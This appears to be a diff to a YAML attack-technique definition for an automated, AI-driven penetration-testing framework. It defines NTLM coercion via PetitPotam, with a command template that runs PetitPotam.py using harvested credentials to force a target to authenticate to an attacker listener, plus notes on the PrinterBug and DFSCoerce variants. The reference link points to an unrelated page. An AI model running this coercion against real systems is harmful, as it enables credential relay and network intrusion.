@@ -10,8 +10,7 @@ parameters:
   listener_ip: from_engagement.attacker_ip
   username: from_cred.username
   password: from_cred.password
-command_template: python3 PetitPotam.py {listener_ip} {target_ip} -u '{username}'
-  -p '{password}'
+command_template: python3 PetitPotam.py {listener_ip} {target_ip} -u '{username}' -p '{password}'
 parser: generic_parser
 expected_effects:
 - ntlm_auth_coerced
@@ -19,7 +18,15 @@ falsifier:
   pattern: Attack Failed|ERROR
   timeout: 30
 model_tier: haiku
-mechanism: Forces target to authenticate to attacker via NTLM. PrinterBug (MS-RPRN)
-  callbacks on port 445. PetitPotam (MS-EFSRPC) callbacks vary — check listener port.
-  DFSCoerce (MS-DFSNM) similar. Must match coercion method to relay listener port.
+mechanism: "Forces target to authenticate to attacker via NTLM. PrinterBug (MS-RPRN) callbacks on port 445. PetitPotam (MS-EFSRPC)\
+  \ callbacks vary \u2014 check listener port. DFSCoerce (MS-DFSNM) similar. Must match coercion method to relay listener\
+  \ port."
 hacktricks_ref: AI/AI-Supervised-Learning-Algorithms.md
+references:
+  ocd_mindmap_node_ids:
+  - 1011603a71
+  - 56e11ecbe7
+  - 9d24a6572c
+  - b1cb8f43db
+  - c7c07946a0
+  - fb87c15854
